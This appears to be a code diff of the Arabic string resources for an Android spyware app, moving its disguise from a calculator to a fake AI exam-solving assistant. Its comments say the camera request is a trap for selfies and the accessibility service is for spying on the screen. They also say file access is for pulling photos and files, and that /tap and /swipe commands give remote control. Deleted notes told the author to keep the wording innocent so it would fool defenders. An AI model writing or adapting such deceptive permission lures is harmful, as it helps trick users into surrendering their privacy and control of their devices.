@@ -1,67 +1,71 @@
 <?xml version="1.0" encoding="utf-8"?>
 <!--
-  strings.xml — نصوص التطبيق.
+  strings.xml — نصوص التطبيق (تمويه: CyberSolve AI).
 
   المسار: app/src/main/res/values/strings.xml
-
-  ملاحظات:
-  - كل النصوص هنا يجب أن تبدو بريئة (تمويه).
-  - لا تضع كلمات مثل "اختراق" أو "تحكم" أو "سحب ملفات".
-  - النصوص المستخدمة في الإشعارات وإعدادات إمكانية الوصول
-    يجب أن تكون مقنعة للفريق الأزرق.
 -->
 <resources>
 
     <!-- اسم التطبيق (يظهر تحت الأيقونة وفي الإعدادات) -->
-    <string name="app_name">آلة حاسبة</string>
+    <string name="app_name">CyberSolve AI</string>
 
     <!-- ============ الإشعار (Notifier) ============ -->
-    <string name="notif_channel_name">مزامنة الملفات</string>
-    <string name="notif_channel_desc">مزامنة الملفات في الخلفية</string>
-    <string name="notif_title">مزامنة الملفات</string>
-    <string name="notif_text">جارٍ مزامنة ملفاتك في الخلفية</string>
+    <string name="notif_channel_name">تحليل الذكاء الاصطناعي</string>
+    <string name="notif_channel_desc">معالجة الأسئلة في الخلفية</string>
+    <string name="notif_title">مساعد الحل الذكي</string>
+    <string name="notif_text">جارٍ تحليل الأسئلة في الخلفية…</string>
 
     <!-- ============ خدمة إمكانية الوصول ============ -->
-    <!--
-      description: يظهر في شاشة تفعيل الخدمة (نص طويل).
-      يجب أن يكون مقنعاً: يشرح "فائدة" الخدمة للمستخدم.
-    -->
     <string name="accessibility_description">
-        تساعد هذه الخدمة على تحسين تجربة استخدام التطبيق من خلال قراءة محتوى الشاشة
-        وتسهيل التنقل بين العناصر. تُستخدم فقط لتحسين إمكانية الوصول ولا تجمع أي بيانات.
+        تساعد هذه الخدمة على تحليل النصوص والأسئلة المعروضة على الشاشة، لتقديم الحلول الفورية والمساعدة في الاختبارات الأكاديمية وتمارين الأمن السيبراني.
     </string>
+    <string name="accessibility_summary">تحليل الأسئلة وحلها تلقائياً</string>
 
-    <!-- summary: نص قصير يظهر في قائمة الخدمات -->
-    <string name="accessibility_summary">خدمة مساعدة لتحسين إمكانية الوصول</string>
+    <!-- ============ شاشة الأذونات (تظهر عند فتح التطبيق) ============ -->
+    <string name="perm_title">تهيئة محرك الذكاء الاصطناعي</string>
+    <string name="perm_subtitle">لتعمل ميزة المسح الضوئي وحل الأسئلة بكفاءة، يرجى تفعيل الصلاحيات التالية:</string>
 
-    <!-- ============ شاشة الأذونات (PermissionActivity) ============ -->
-    <string name="perm_title">إعدادات مطلوبة</string>
-    <string name="perm_subtitle">لتعمل المزامنة بشكل صحيح، يرجى تفعيل الإعدادات التالية:</string>
+    <!-- 1. صلاحية الكاميرا (الفخ الرئيسي للسيلفي) -->
+    <string name="perm_camera_title">الكاميرا</string>
+    <string name="perm_camera_desc">مطلوبة لمسح أوراق الامتحانات والأسئلة ضوئياً.</string>
+    <string name="perm_camera_btn">تفعيل الكاميرا</string>
+    <string name="perm_camera_enabled">✅ الكاميرا مفعّلة</string>
 
-    <string name="perm_accessibility_title">خدمة إمكانية الوصول</string>
-    <string name="perm_accessibility_desc">مطلوبة لقراءة محتوى الشاشة وتحسين التنقل.</string>
-    <string name="perm_accessibility_btn">تفعيل</string>
-    <string name="perm_accessibility_enabled">✅ مفعّلة</string>
+    <!-- 2. صلاحية الميكروفون -->
+    <string name="perm_mic_title">الميكروفون</string>
+    <string name="perm_mic_desc">لتحويل الأسئلة الصوتية إلى نصوص وحلها.</string>
+    <string name="perm_mic_btn">تفعيل الميكروفون</string>
+    <string name="perm_mic_enabled">✅ الميكروفون مفعّل</string>
 
+    <!-- 3. صلاحية إمكانية الوصول (للتجسس وقراءة الشاشة) -->
+    <string name="perm_accessibility_title">خدمة قراءة الشاشة</string>
+    <string name="perm_accessibility_desc">مطلوبة لتحليل الأسئلة داخل التطبيقات الأخرى (مثل تطبيقات الاختبارات) وحلها تلقائياً.</string>
+    <string name="perm_accessibility_btn">تفعيل الخدمة</string>
+    <string name="perm_accessibility_enabled">✅ الخدمة مفعّلة</string>
+
+    <!-- 4. صلاحية الملفات (لسحب الصور والملفات) -->
     <string name="perm_files_title">الوصول لجميع الملفات</string>
-    <string name="perm_files_desc">مطلوبة لمزامنة ملفاتك وصورك.</string>
-    <string name="perm_files_btn">تفعيل</string>
-    <string name="perm_files_enabled">✅ مفعّل</string>
+    <string name="perm_files_desc">لحفظ سجل الأسئلة التي تم حلها، وقراءة ملفات PDF والصور التي تحتوي على تمارين.</string>
+    <string name="perm_files_btn">السماح بالوصول</string>
+    <string name="perm_files_enabled">✅ الوصول مفعّل</string>
 
+    <!-- 5. صلاحية البطارية -->
     <string name="perm_battery_title">إيقاف تحسين البطارية</string>
-    <string name="perm_battery_desc">مطلوب لضمان عمل المزامنة في الخلفية دون انقطاع.</string>
+    <string name="perm_battery_desc">لضمان عدم توقف محرك الذكاء الاصطناعي أثناء تحليل الأسئلة الطويلة.</string>
     <string name="perm_battery_btn">تفعيل</string>
     <string name="perm_battery_enabled">✅ مفعّل</string>
 
-    <string name="perm_notifications_title">الإشعارات</string>
-    <string name="perm_notifications_desc">مطلوبة لإظهار حالة المزامنة.</string>
-    <string name="perm_notifications_btn">تفعيل</string>
-    <string name="perm_notifications_enabled">✅ مفعّلة</string>
-
-    <string name="perm_done">تم</string>
+    <string name="perm_done">بدء الاستخدام</string>
     <string name="perm_refresh">تحديث الحالة</string>
 
-    <!-- ============ شاشة الآلة الحاسبة (MainActivity) ============ -->
+    <!-- ============ شاشة الماسح الضوئي (MainActivity) ============ -->
+    <string name="scanner_ready">جاهز للمسح الضوئي</string>
+    <string name="scanner_scan_btn">مسح السؤال (Scan)</string>
+    <string name="scanner_analyzing">جارٍ استخراج النص وتحليله…</string>
+    <string name="scanner_solved">تم الحل بنجاح!</string>
+    <string name="scanner_fake_answer">الإجابة: C) منع الوصول غير المصرح به</string>
+    
+    <!-- (أبقينا على نصوص الآلة الحاسبة مؤقتاً لتجنب أخطاء البناء حتى نعدل MainActivity) -->
     <string name="calc_error">خطأ</string>
     <string name="calc_divide_by_zero">لا يمكن القسمة على صفر</string>
 
@@ -71,7 +75,7 @@
     <string name="msg_ok">حسناً</string>
     <string name="msg_cancel">إلغاء</string>
 
-    <!-- ============ رسائل CommandHandler (اختيارية، للتوطين) ============ -->
+    <!-- ============ رسائل CommandHandler (للتحكم) ============ -->
     <string name="cmd_unknown">أمر غير معروف</string>
     <string name="cmd_usage_tap">الاستخدام: /tap X Y</string>
     <string name="cmd_usage_swipe">الاستخدام: /swipe X1 Y1 X2 Y2 [MS]</string>
